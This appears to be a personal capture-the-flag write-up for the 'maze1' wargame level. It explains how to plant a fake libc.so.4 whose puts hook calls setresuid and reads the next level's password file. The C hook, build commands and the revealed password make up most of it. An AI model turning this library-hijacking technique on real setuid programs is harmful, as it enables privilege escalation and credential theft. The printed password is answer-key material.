```assembly
  0x0804849b <+0>:	push   %ebp
   0x0804849c <+1>:	mov    %esp,%ebp
   0x0804849e <+3>:	push   $0x8048540
   0x080484a3 <+8>:	call   0x8048380 <puts@plt>
   0x080484a8 <+13>:	add    $0x4,%esp
   0x080484ab <+16>:	mov    $0x0,%eax
   0x080484b0 <+21>:	leave  
   0x080484b1 <+22>:	ret 
```

**ERROR while running executable**

./maze1: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory

Step1:

​		ldd prints the shared objects(shared libraries) required by each program or shared object

​			**ldd ./maze1** 

​			**output**: shows that ./libc.so.4 is not present.

​			![Screen Shot 2019-12-30 at 9.03.57 PM](/Users/tomal/Desktop/Screen Shot 2019-12-30 at 9.03.57 PM.png)

**OFF topic but good explanation**

When you execute a program, the dynamic linker looks at this list of libraries. It locates the libraries on the filesystem based on configuration files and environment variables, loads the libraries into memory, links the pieces together to make a working whole, and finally executes the program.



**Solution:**

​	From the disassembly we can see that it only calls the puts function. As the libc.so.4 is missing in this case, the solution concept is to provide are own shared object file and overwirte the puts system call to get the content of **/etc/maze_pass/maze2**. Another additional task that we have to do is to set the effective user id first. Maze0 does that. Therefore, we will first write a c program to over wirte the puts system call and build a shared object file names **libc.so.4** then run the maze1 with that.

**step 1 :** create a seprate directory such as **/tmp/tomal**

hook.c

```c
int puts (const char *s)
{
        int ret = setresuid(geteuid(),geteuid(),geteuid());
        printf("Returned id %d\n",ret);
        FILE *file = fopen("/etc/maze_pass/maze2", "r");
        if (file == NULL) {
                printf("file opening failed");
        }
        char c;
        c = fgetc(file);
        while (c !=EOF)
        {
                printf("%c",c);
                c = fgetc (file);
        }
        fclose(file);
        return 0;
}
```

**step 2** compile the c file to get the object file. 

```
 gcc -m32 -fPIC -c hook.c
```

this creates the hook.o file.

**step 3:**  create the shared object file from hook.o

```
ld -shared -m elf_i386 -o libc.so.4 hook.o -ldl
```

**step 4:** run the executable file from /tmp/tomal

```
/maze/maze1
```

**password:** fooghihahr

